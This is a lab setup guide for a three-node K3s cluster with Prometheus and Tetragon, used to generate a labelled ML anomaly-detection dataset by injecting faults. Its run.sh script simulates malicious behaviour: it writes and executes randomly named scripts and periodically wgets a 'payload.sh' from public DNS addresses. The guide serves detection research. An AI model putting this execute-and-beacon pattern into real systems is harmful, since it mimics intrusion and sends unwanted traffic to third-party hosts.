# K3s Server/Worker Cluster, Monitoring Setup & ML Dataset Pipeline

This guide covers setting up a K3s cluster (1 server, 2 workers), deploying Prometheus/Tetragon, orchestrating workloads, and extracting a clean dataset.

## 0. Cluster Setup (Single Server)

**Target Architecture:**
- 3 nodes (1 server, 2 workers)
- Lightweight SQLite database
- RAM limit: 2GB per node (6GB total)

| Node | IP | Role | RAM |
|---|---|---|---|
| Node 1 | 192.168.56.10 | Control Plane (Server) | 2GB |
| Node 2 | 192.168.56.11 | Worker (Agent) | 2GB |
| Node 3 | 192.168.56.12 | Worker (Agent) | 2GB |

**Network Setup:**
Each VM should have Adapter 1 as NAT and Adapter 2 as Host-only (Static IP).


mount -t vboxsf byzantine_node_proj /mnt/shared

### Step 0.1: Install First Control Plane Node (Node 1)

Proper Fix (Disable cloud-init network management)
Step 1 — Check if file exists
ls /etc/netplan

If you see:

50-cloud-init.yaml

Then this is the cause.

Step 2 — Disable cloud-init network config

Create this file:

sudo nano /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg

Add:

network: {config: disabled}

Save.

Step 3 — Remove the cloud-init netplan file
sudo rm /etc/netplan/50-cloud-init.yaml
Step 4 — Create Your Own Stable Netplan File

Create a new file:

sudo nano /etc/netplan/01-static.yaml

Put this:

network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: no
      addresses:
        - 192.168.56.10/24

(Adjust IP per node.)

Step 5 — Apply
sudo netplan generate
sudo netplan apply
Step 6 — Reboot to Confirm
sudo reboot

After reboot:

ip a

Your static IP should remain.
On Node 1 (`192.168.56.10`):
```bash
curl -sfL https://get.k3s.io | sh -s - server \
  --node-ip=192.168.56.10 \
  --disable traefik
```
Get the cluster token and save it:
```bash
sudo cat /var/lib/rancher/k3s/server/node-token
```

### Step 0.2: Join First Worker (Node 2)
On Node 2 (`192.168.56.11`):
```bash
curl -sfL https://get.k3s.io | sh -s - agent \
  --server https://192.168.56.10:6443 \
  --token <token> \
  --node-ip=192.168.56.11
```

### Step 0.3: Join Second Worker (Node 3)
On Node 3 (`192.168.56.12`):
```bash
curl -sfL https://get.k3s.io | sh -s - agent \
  --server https://192.168.56.10:6443 \
  --token <token> \
  --node-ip=192.168.56.12
```

### Step 0.4: Verify Cluster
From Node 1:
```bash
sudo k3s kubectl get nodes
```

---

## 1. Prerequisites (For Monitoring)

To properly orchestrate monitoring (Prometheus/Tetragon) and dataset injection, your environment must be correctly configured.

### Step 1.1: Configure kubectl (Node 1)
By default, K3s places the kubeconfig file where only `root` can access it, and you have to type `k3s kubectl`. To use standard `kubectl` without `sudo`:

Run this on Node 1:
```bash
mkdir -p ~/.kube
sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown $(id -u):$(id -g) ~/.kube/config
echo 'export KUBECONFIG=~/.kube/config' >> ~/.bashrc
source ~/.bashrc
```
Test it works by simply running: `kubectl get nodes`

### Step 1.2: Install Helm (Node 1)
Helm is the package manager for Kubernetes. You need it to install the monitoring stack.

Run this on Node 1:
```bash
curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
chmod 700 get_helm.sh
./get_helm.sh
rm get_helm.sh
```
Test it works: `helm version`

### Step 1.3: Prevent Time Drift (All 3 Nodes)
Machine Learning anomaly detection relies on precise timestamps down to the second. Virtual Machines often suffer from "Time Drift".

**Run this command on EVERY node (Node 1, Node 2, and Node 3):**
```bash
sudo apt update && sudo apt install -y systemd-timesyncd
sudo systemctl enable --now systemd-timesyncd
sudo timedatectl set-ntp true
```
You can verify clocks are synced by running `timedatectl status` on each machine.

---

## 1. Install Monitoring Stack

### 1.1 Prometheus (kube-prometheus-stack)

Install the lightweight Prometheus stack using the custom `prometheus-values.yaml` (which includes memory limits):
```bash
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
kubectl create namespace monitoring
helm install prometheus prometheus-community/kube-prometheus-stack \
  --namespace monitoring -f prometheus-values.yaml
```

**Access Method (Better Than Port-Forward):**
Instead of constantly port-forwarding, change the Prometheus service to `NodePort`:
```bash
kubectl edit svc prometheus-kube-prometheus-prometheus -n monitoring
```
Change `type: ClusterIP` to `type: NodePort`. Now, you can access the Prometheus API at `http://192.168.56.10:<nodeport>`. Make sure your python script points to this address.

### 1.2 Tetragon (eBPF Security)

Tetragon is kernel-level eBPF tracing and consumes memory per node. We use the custom `tetragon-values.yaml` to strict its limit to 400Mi per node.
```bash
helm repo add cilium https://helm.cilium.io
helm install tetragon cilium/tetragon \
  --namespace kube-system -f tetragon-values.yaml
```

### 1.3 Apply Tetragon Tracing Policy (Required)
Forces Tetragon to trace outbound TCP connections for mining port detection.
```bash
kubectl apply -f tcp-connect-policy.yaml
```

---

## 2. Dataset Generation Pipeline (Execution Order)

To generate the final dataset, strictly follow this execution order across three terminals.

### build this image for crash loop fault

1️⃣ Create Crash-Loop Image

Inside your VM.

📁 Create folder
mkdir -p crash-loop-image
cd crash-loop-image
📄 Dockerfile

Create:

nano Dockerfile

Paste:

FROM alpine:latest

RUN apk add --no-cache stress-ng

CMD ["/bin/sh"]

Save.

✅ 2️⃣ Build Image (Inside VM)
docker build -t crash-loop-stress:latest .
✅ 3️⃣ Import Image Into k3s (IMPORTANT)

k3s uses containerd, not Docker.

So run:

docker save crash-loop-stress:latest | sudo k3s ctr images import -

Verify:

sudo k3s ctr images list | grep crash-loop

You should see:

crash-loop-stress:latest

plus Build inside VM
docker build -t suspicious-network:latest .
Import into k3s
docker save suspicious-network:latest | sudo k3s ctr images import -

Verify:

sudo k3s ctr images list | grep suspicious

Step 1 — Create Image Directory

Inside VM:

mkdir security-tmp-exec-image
cd security-tmp-exec-image
✅ Step 2 — Payload Script (Moved From YAML)

Create:

nano run.sh
📄 run.sh
#!/bin/sh

echo "Simulating malicious execution from ${EXEC_PATH}..."

TARGETS="1.1.1.1 8.8.8.8 9.9.9.9"

mkdir -p ${EXEC_PATH}

while true; do

  # Random filename (polymorphic payload)
  RAND=$RANDOM
  SCRIPT="${EXEC_PATH}/bad_${RAND}.sh"

  echo "#!/bin/sh" > $SCRIPT
  echo "echo Malicious execution id $RAND" >> $SCRIPT
  echo "echo RANDOM_VALUE=$RANDOM" >> $SCRIPT

  chmod +x $SCRIPT

  # Execute payload
  $SCRIPT

  ###################################
  # Occasional network beacon/payload
  ###################################
  if [ $((RANDOM % 4)) -eq 0 ]; then
      TARGET=$(echo $TARGETS | tr ' ' '\n' | shuf -n1)
      echo "Fetching remote payload from $TARGET"
      wget -q --timeout=2 http://$TARGET/payload.sh -O /dev/null || true
  fi

  # Random execution interval
  sleep $((RANDOM % EXEC_INTERVAL + 1))

done

Make executable:

chmod +x run.sh
✅ Step 3 — Dockerfile

Create:

nano Dockerfile
📄 Dockerfile
FROM alpine:latest

RUN apk add --no-cache wget coreutils

COPY run.sh /run.sh

RUN chmod +x /run.sh

ENTRYPOINT ["/run.sh"]
✅ Step 4 — Build Image (Inside VM)
docker build -t security-tmp-exec:latest .
✅ Step 5 — Import Into k3s
docker save security-tmp-exec:latest | sudo k3s ctr images import -

Verify:

sudo k3s ctr images list | grep security-tmp

### Terminal 1: Start Normal Workloads
Deploy the standard background noise (Nginx, Redis, APIs).
```bash
cd workloads
bash run_normal_baseline.sh
```

### Terminal 2: Start Telemetry Collection
Start the python script to continuously pull Prometheus + Tetragon metrics and write them to `node_metrics.csv`.

*If you are still using port-forwarding instead of NodePort, ensure you use the correct ports:*
```bash
kubectl port-forward svc/prometheus-grafana 3000:80 -n monitoring
kubectl port-forward svc/prometheus-kube-prometheus-prometheus 9090:9090 -n monitoring
```
*(Your Python script `collect_baseline.py` must query `http://localhost:9090/api/v1/query`, not 8080!)*
```bash
# In another tab
cd k3s-monitoring-setup
pip install requests
python collect_baseline.py
```
*Leave this running!*

### Terminal 3: Inject Anomalies (Scenario Runner)
While `collect_baseline.py` is safely gathering data in Terminal 2, run the automated scenario injector. This will deploy faults (CPU stress, OOM loops) and security anomalies (/tmp execution), logging their exact start/end timestamps to `scenario_labels.csv`.
```bash
cd workloads
python scenario_runner.py
```
*Wait for this script to finish (~30 mins).*
*Once finished, you can safely `Ctrl+C` terminate Terminal 2 (`collect_baseline.py`).*

---

## 3. Labeling the Dataset

You now have raw unlabelled telemetry (`node_metrics.csv`) and a master list of incident windows (`scenario_labels.csv`).

To combine them into a ML-ready format, use the labeling script:

```bash
cd k3s-monitoring-setup
python label_dataset.py
```

### Note on Time Adjustments (Padding)
`label_dataset.py` automatically implements "Time Padding" to prevent inconsistencies:
- **Start Padding (+10s)**: It ignores the first 10 seconds of a fault to allow time for the anomaly (like a slow memory leak) to actually manifest in the system metrics.
- **End Padding (+15s)**: It extends the anomaly label for 15 seconds after the fault is deleted, ensuring residual CPU/Network spikes during "cluster recovery" aren't mistakenly labeled as normal data.

**Output:** `final_labeled_dataset.csv` (Ready for ML Training).
